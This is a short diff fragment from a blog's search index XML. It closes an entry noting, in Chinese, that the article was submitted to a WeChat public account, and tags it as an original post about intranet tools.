+<h6 id="此篇文章已投稿于公众号-酒仙桥六号部队"><a href="#此篇文章已投稿于公众号-酒仙桥六号部队" class="headerlink" title="此篇文章已投稿于公众号 - 酒仙桥六号部队"></a>此篇文章已投稿于公众号 - 酒仙桥六号部队</h6>]]></content>
+      <categories>
+        <category>原创文章</category>
+      </categories>
+      <tags>
+        <tag>内网工具</tag>
+      </tags>
+  </entry>
+</search>
